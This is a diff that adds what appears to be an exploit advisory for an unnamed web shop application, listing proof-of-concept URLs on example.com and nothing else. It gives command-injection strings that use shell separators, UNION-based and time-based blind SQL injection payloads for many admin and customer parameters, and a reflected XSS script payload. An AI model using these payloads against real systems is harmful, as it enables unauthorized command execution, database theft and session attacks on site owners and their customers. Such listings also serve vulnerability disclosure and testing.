@@ -1,0 +1,31 @@
+A) Multiple Remote Command Execution
+
+http://www.example.com/admin/uploadItem.php?image=.;  ;
+http://www.example.com/admin/removeItemResponse.php?ItemID=.; ping localhost ;
+http://www.example.com/admin/removeCategoryResponse.php?CategoryID=-1' UNION SELECT '; ping localhost ;'%23
+
+
+B) Multiple SQL Injection
+
+http://www.example.com/description.php?II=-1' UNION SELECT 1,2,3,4,5,6,7%23&UID=VALID UID HERE
+http://www.example.com/receipt.php?BI=' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19%23
+http://www.example.com/admin/searchReceiptsResponse?criteria=order&OrderNumber=-1' UNION SELECT 1,2,3,4,5,6%23
+http://www.example.com/admin/searchReceiptsResponse?criteria=name&User=%25' UNION SELECT 1,2,3,4,5,6%23
+http://www.example.com/admin/searchReceiptsResponse?Year=%25' UNION SELECT 1,2,3,4,5,6%23
+http://www.example.com/admin/searchReceiptsResponse?Month=%25' UNION SELECT 1,2,3,4,5,6%23
+http://www.example.com/admin/searchReceiptsResponse?Day=%25' UNION SELECT 1,2,3,4,5,6%23
+
+
+C) Multiple Blind SQL Injection
+
+http://www.example.com/index.php?UID=' OR (SELECT(IF(0x41=0x41, BENCHMARK(999999999.,NULL),NULL)))%23
+http://www.example.com/removeItem.php?CartItemsID=-1' OR (SELECT(IF(0x41=0x41, BENCHMARK(999999999.,NULL),NULL)))%23
+http://www.example.com/removeItemResponse?ItemID=-1' OR (SELECT(IF(0x41=0x41, BENCHMARK(999999999.,NULL),NULL)))%23
+http://www.example.com/admin/removeCategoryResponse.php?CategoryID=-1' OR (SELECT(IF(0x41=0x41, BENCHMARK(999999999.,NULL),NULL)))%23
+
+
+D) XSS
+
+http://www.example.com/receipt.php?ON=&lt;script&gt;alert('xss');&lt;/script&gt;
+
+
